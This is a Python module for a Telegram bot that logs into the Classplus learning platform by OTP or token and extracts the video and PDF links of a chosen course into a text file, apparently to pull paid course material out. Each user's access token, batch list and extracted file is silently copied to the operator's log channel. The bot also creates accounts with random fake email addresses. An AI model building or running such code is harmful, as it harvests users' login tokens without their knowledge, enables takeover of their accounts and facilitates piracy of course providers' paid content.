import requests
import json
import random
import uuid
import time
import asyncio
import io
import aiohttp
from pyrogram import Client, filters
import os
from Extractor import app
import cloudscraper
import concurrent.futures
import re
from config import PREMIUM_LOGS

log_channel = PREMIUM_LOGS

apiurl = "https://api.classplusapp.com"
s = cloudscraper.create_scraper() 

@app.on_message(filters.command(["cp"]))
async def classplus_txt(app, message):
    # Step 1: Ask for details
    details = await app.ask(message.chat.id, "<blockquote>**Send Login Token or Send ORG_CODE & Mobile like this : \n ORG_CODE*Mobile**</blockquote>")
    user_input = details.text.strip()


    if "*" in user_input:
        try:
            org_code, mobile = user_input.split("*")
            
            device_id = str(uuid.uuid4()).replace('-', '')
            headers = {
    "Accept": "application/json, text/plain, */*",
    "region": "IN",
    "accept-language": "en",
    "Content-Type": "application/json;charset=utf-8",
    "Api-Version": "51",
    "device-id": device_id
            }
            
            # Step 2: Fetch Organization Details
            org_response = s.get(f"{apiurl}/v2/orgs/{org_code}", headers=headers).json()
            org_id = org_response["data"]["orgId"]
            org_name = org_response["data"]["orgName"]

            # Step 3: Generate OTP
            otp_payload = {
                'countryExt': '91',
                'orgCode': org_name,
                'viaSms': '1',
                'mobile': mobile,
                'orgId': org_id,
                'otpCount': 0
            }
             
            otp_response = s.post(f"{apiurl}/v2/otp/generate", json=otp_payload, headers=headers)
            print(otp_response)

            if otp_response.status_code == 200:
                otp_data = otp_response.json()
                session_id = otp_data['data']['sessionId']
                print(session_id)

                # Step 4: Ask for OTP
                user_otp = await app.ask(message.chat.id, "<blockquote> OTP sent to your mobile. Please reply with the OTP </blockquote>", timeout=300)

                if user_otp.text.isdigit():
                    otp = user_otp.text.strip()
                    print(otp)

                    # Step 5: Verify OTP
                    fingerprint_id = str(uuid.uuid4()).replace('-', '')
                    verify_payload = {
                        "otp": otp,
                        "countryExt": "91",
                        "sessionId": session_id,
                        "orgId": org_id,
                        "fingerprintId": fingerprint_id,
                        "mobile": mobile
                    }
                    
                    verify_response = s.post(f"{apiurl}/v2/users/verify", json=verify_payload, headers=headers)
                    

                    if verify_response.status_code == 200:
                        verify_data = verify_response.json()

                        if verify_data['status'] == 'success':
                            # OTP Verified - Proceed with Login
                            token = verify_data['data']['token']
                            s.headers['x-access-token'] = token
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")


                    elif verify_response.status_code == 201:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                    
                    elif verify_response.status_code == 409:

                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            
                            else:
                                await message.reply("Failed to verify OTP. Please try again.")
                        else:
                            await message.reply("NO BATCH FOUND OR ENTERED OTP IS NOT CORRECT .")
                    else:
                        email = str(uuid.uuid4()).replace('-', '') + "@gmail.com"
                        abcdefg_payload = {
                            "contact": {
                                "email": email,
                                "countryExt": "91",
                                "mobile": mobile
                            },
                            "fingerprintId": fingerprint_id,
                            "name": "name",
                            "orgId": org_id,
                            "orgName": org_name,
                            "otp": otp,
                            "sessionId": session_id,
                            "type": 1,
                            "viaEmail": 0,
                            "viaSms": 1
                        }
    
                        abcdefg_response = s.post("https://api.classplusapp.com/v2/users/register", json=abcdefg_payload, headers=headers)
                        
                        

                        if abcdefg_response.status_code == 200:
                            abcdefg_data = abcdefg_response.json()
                            token = abcdefg_data['data']['token']
                            s.headers['x-access-token'] = token
                        
                            await message.reply_text(f"<blockquote> Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            await app.send_message(log_channel, f"<blockquote>Login successful! Your access token for future use:\n\n`{token}` </blockquote>")
                            

                            headers = {
                                 'x-access-token': token,
                                 'user-agent': 'Mobile-Android',
                                 'app-version': '1.4.65.3',
                                 'api-version': '29',
                                 'device-id': '39F093FF35F201D9'
                             }
                            response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)  # Corrected indentation here
                            if response.status_code == 200:
                                courses = response.json()["data"]["courses"]
                                s.session_data = {"token": token, "courses": {course["id"]: course["name"] for course in courses}}
                                await fetch_batches(app, message, org_name)
                            else:
                                await message.reply("NO BATCH FOUND ")
                        else:
                            await message.reply("wrong OTP ")
                else:
                    await message.reply("Failed to generate OTP. Please check your details and try again.")

        except Exception as e:
            await message.reply(f"Error: {str(e)}")

    elif len(user_input) > 20:
        a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
        await app.send_message(log_channel, a)
        headers = {
            'x-access-token': user_input,
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }
        response = s.get(f"{apiurl}/v2/courses?tabCategoryId=1", headers=headers)
        if response.status_code == 200:
            courses = response.json()["data"]["courses"]
    
            s.session_data = {
                "token": user_input,
                "courses": {course["id"]: course["name"] for course in courses}
            }

            org_name = None

            for course in courses:
                shareable_link = course["shareableLink"]
    
                if "courses.store" in shareable_link:
  
                    new_data = shareable_link.split('.')[0].split('//')[-1]
                    org_response = s.get(f"https://api.classplusapp.com/v2/orgs/{new_data}", headers=headers)
        
                    if org_response.status_code == 200:
                        org_data = org_response.json().get("data", {})
                        org_id = org_data.get("orgId")
                        org_name = org_data.get("orgName")
                else:
                    org_name = shareable_link.split('//')[1].split('.')[1]

                print(f"Org Name: {org_name}")

            await fetch_batches(app, message, org_name)
        else:
            await message.reply("Invalid token. Please try again.")
    else:
        await message.reply("Invalid input. Please send details in the correct format.")



async def fetch_batches(app, message, org_name):
    session_data = s.session_data
    
    if "courses" in session_data:
        courses = session_data["courses"]
        
        
      
        text = "Available batches:\n\n"
        course_list = []
        for idx, (course_id, course_name) in enumerate(courses.items(), start=1):
            text += f"{idx}. {course_name}\n"
            course_list.append((idx, course_id, course_name))
        
        mo = (f"<blockquote>{text}</blockquote>") 
        await app.send_message(log_channel, mo)
        selected_index = await app.ask(message.chat.id, f"<blockquote>{text}\nReply with the index number of the batch to extract.</blockquote>", timeout=180)
        
        
        if selected_index.text.isdigit():
            selected_idx = int(selected_index.text.strip())
            
            if 1 <= selected_idx <= len(course_list):
                selected_course_id = course_list[selected_idx - 1][1]
                selected_course_name = course_list[selected_idx - 1][2]
                
                await app.send_message(message.chat.id, f"<blockquote>Extracting batch: {selected_course_name} (ID: {selected_course_id})...</blockquote>")
                await extract_batch(app, message, org_name, selected_course_id)
            else:
                await app.send_message(message.chat.id, "Invalid index number. Please try again.")
                  
        else:
            await app.send_message(message.chat.id, "Invalid input. Please reply with a valid index number.")
              
    else:
        await app.send_message(message.chat.id, "No batches available. Please check your credentials.")


async def extract_batch(app, message, org_name, batch_id):
    session_data = s.session_data
    
    if "token" in session_data:
        batch_name = session_data["courses"][batch_id]
        headers = {
            'x-access-token': session_data["token"],
            'user-agent': 'Mobile-Android',
            'app-version': '1.4.65.3',
            'api-version': '29',
            'device-id': '39F093FF35F201D9'
        }

# inside your extract_batch function, only replacing process_course_contents

        async def process_course_contents(course_id, folder_id=0, folder_path=""):
            """Fetch and process course content recursively."""
            result = []
            url = f'{apiurl}/v2/course/content/get?courseId={course_id}&folderId={folder_id}'

            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers) as resp:
                    course_data = await resp.json()
                    course_data = course_data["data"]["courseContent"]
                    
            tasks = []
            for item in course_data:
                content_type = str(item['contentType'])
                sub_id = item['id']
                sub_name = item['name']

                if content_type in ("2", "3"):  # Video or PDF
                    url = item["url"]
                    full_name = f"{folder_path}{sub_name}: {url}\n"
                    result.append(full_name)
                elif content_type == "1":  # Folder
                 new_folder_path = f"{folder_path}{sub_name} - "
                 tasks.append(process_course_contents(course_id, sub_id, new_folder_path))

            sub_contents = await asyncio.gather(*tasks)
            for sub_content in sub_contents:
                result.extend(sub_content)

            return result

        async def fetch_live_videos(course_id):
            """Fetch live videos from the API."""
            outputs = []
            async with aiohttp.ClientSession() as session:
                try:
                    url = f"{apiurl}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=9999&offset=0"
                    async with session.get(url, headers=headers) as response:
                        j = await response.json()
                        if "data" in j and "list" in j["data"]:
                            for video in j["data"]["list"]:
                                name = video.get("name", "Unknown Video")
                                video_url = video.get("url", "")
                                if video_url:
                                    outputs.append(f"{name}: {video_url}\n")
                except Exception as e:
                    print(f"Error fetching live videos: {e}")

            return outputs

        async def write_to_file(extracted_data):
            """Write data to a text file asynchronously."""
            # Define characters to remove and replace
            invalid_chars = '\t:/+#|@*.'
            # Create a clean filename by removing invalid characters and replacing underscore with space
            clean_name = ''.join(char for char in batch_name if char not in invalid_chars)
            clean_name = clean_name.replace('_', ' ')
            file_path = f"{clean_name}.txt"
            
            with open(file_path, "w", encoding='utf-8') as file:
                file.write(''.join(extracted_data))  
            return file_path

        extracted_data, live_videos = await asyncio.gather(
            process_course_contents(batch_id),
            fetch_live_videos(batch_id)
        )

        extracted_data.extend(live_videos)

        file_path = await write_to_file(extracted_data)

        
        c_text = f"App Name : {org_name}\n\nBATCH NAME : {batch_name}"

        await app.send_document(message.chat.id, file_path, caption=c_text)
        await app.send_document(log_channel, file_path, caption=c_text)

        os.remove(file_path)
            

    
